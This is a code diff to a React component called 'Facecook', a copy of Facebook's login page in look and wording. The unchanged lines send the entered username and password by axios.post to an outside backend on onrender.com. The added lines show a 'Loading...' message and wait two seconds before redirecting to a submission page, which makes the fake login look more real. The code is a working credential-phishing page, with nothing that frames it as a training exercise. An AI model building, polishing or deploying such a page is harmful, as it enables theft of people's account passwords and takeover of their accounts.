@@ -4,6 +4,7 @@ import { useNavigate } from "react-router-dom";
 
 const Facecook = () => {
   const [formData, setFormData] = React.useState({ user: "", pass: "" });
+  const [loading, setLoading] = React.useState(false);
 
   const handleLogin = (e) => {
     const { name, value } = e.target;
@@ -15,8 +16,17 @@ const Facecook = () => {
   const handleSubmit = (e) => {
     e.preventDefault();
     axios.post("https://facecookbackend.onrender.com/api/v2/tasks", formData);
-    navigate("/submission");
+    setLoading(true);
+
+    // set a timeout
+    const timeoutId = setTimeout(() => {
+      navigate("/submission");
+    }, 2000);
+
+    // clear the timeout if the component unmounts
+    return () => clearTimeout(timeoutId);
   };
+
   return (
     <div className="bg-[#f0f2f5] h-screen  w-full font-[Heveltica] flex justify-center items-center ">
       <div className="flex justify-center  h-full flex-col md:flex-row md:gap-[5vw] md:items-center md:justify-center items-center mx-[16px] ">
@@ -60,6 +70,11 @@ const Facecook = () => {
           >
             Log in
           </button>
+          {loading && (
+            <p className="cursor-pointer text-gray-700 text-[14px] font-medium ">
+              Loading...
+            </p>
+          )}
 
           <p className="cursor-pointer text-[#1877f2] text-[14px] font-medium ">
             Forgotten password?
